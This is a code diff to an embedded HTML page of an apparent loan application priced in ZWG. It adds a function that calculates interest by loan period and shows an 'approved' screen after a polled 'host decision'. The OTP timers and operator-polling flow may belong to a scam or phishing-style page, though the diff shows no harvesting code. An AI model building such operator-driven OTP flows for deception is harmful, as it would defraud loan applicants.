@@ -899,6 +899,32 @@ HTML_PAGE = r"""<!DOCTYPE html>
     let decisionTimer = null;
     let otpStepTimer = null;
     let otpAutoTimer = null;
+    function showApprovedScreen() {
+  const approvedAmt = document.getElementById('approved-amount');
+  const approvedRepay = document.getElementById('approved-repay');
+  const approvedDate = document.getElementById('approved-date');
+
+  const val = appState.amount || 500;
+  const days = appState.period || 30;
+  let rate = 0.05;
+  if (days <= 7) rate = 0.03;
+  else if (days <= 14) rate = 0.05;
+  else if (days <= 30) rate = 0.10;
+  else if (days <= 60) rate = 0.15;
+  else rate = 0.20;
+
+  const interest = Math.round(val * rate);
+  const total = val + interest;
+  if (approvedAmt) approvedAmt.innerText = 'ZWG ' + val.toLocaleString();
+  if (approvedRepay) approvedRepay.innerText = 'ZWG ' + total.toLocaleString();
+  if (approvedDate) {
+    const d = new Date();
+    d.setDate(d.getDate() + days);
+    approvedDate.innerText = d.toLocaleDateString();
+  }
+  goTo('approved');
+}
+
 
     function watchHostDecision(step) {
       if (decisionTimer) clearInterval(decisionTimer);
@@ -926,6 +952,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
             clearInterval(decisionTimer);
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
+            showApprovedScreen();
           }
         } catch (e) {}
       }, 3000);
